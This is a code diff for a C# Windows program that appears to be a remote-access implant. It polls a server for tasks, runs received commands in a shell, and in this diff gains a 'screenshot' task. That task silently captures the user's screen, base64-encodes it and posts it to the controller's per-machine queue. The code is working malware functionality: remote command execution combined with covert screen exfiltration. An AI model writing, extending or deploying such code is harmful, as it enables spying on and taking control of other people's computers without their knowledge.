@@ -8,6 +8,11 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using Newtonsoft.Json.Linq;
 using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Drawing.Imaging;
+using System.Linq;
+using System.Net;
 
 namespace raju
 {
@@ -88,6 +93,18 @@ namespace raju
             p.WaitForExit();
 
             return output;
+        }
+
+        private string Base64Screenshot()
+        {
+            using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
+            using (MemoryStream ms = new MemoryStream())
+            using (Graphics g = Graphics.FromImage(screenshot))
+            {
+                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
+                screenshot.Save(ms, ImageFormat.Png);
+                return Convert.ToBase64String(ms.GetBuffer());
+            }
         }
 
         private void SetupTimers()
@@ -188,7 +205,6 @@ namespace raju
                 };
 
             Console.WriteLine(inputTask.Value<String>("task"));
-            Console.WriteLine(inputTask.Value<JArray>("args").First.Value<String>());
 
             switch (inputTask.Value<String>("task"))
             {
@@ -197,6 +213,9 @@ namespace raju
                     break;
                 case "cmd":
                     data.Add("body", RunCommandInShell(inputTask.Value<JArray>("args").First.Value<String>()));
+                    break;
+                case "screenshot":
+                    data.Add("body", Base64Screenshot());
                     break;
                 default:
                     Console.WriteLine("Invalid Task");
@@ -209,8 +228,9 @@ namespace raju
 
         private async void PostCompletedTask(Dictionary<string, string> data)
         {
-            var content = new FormUrlEncodedContent(data);
-            await client.PostAsync("shyaam/" + machineID + "/queue", content);
+            var encodedItems = data.Select(i => WebUtility.UrlEncode(i.Key) + "=" + WebUtility.UrlEncode(i.Value));
+            var encodedContent = new StringContent(String.Join("&", encodedItems), null, "application/x-www-form-urlencoded");
+            await client.PostAsync("shyaam/" + machineID + "/queue", encodedContent);
         }
     }
 }
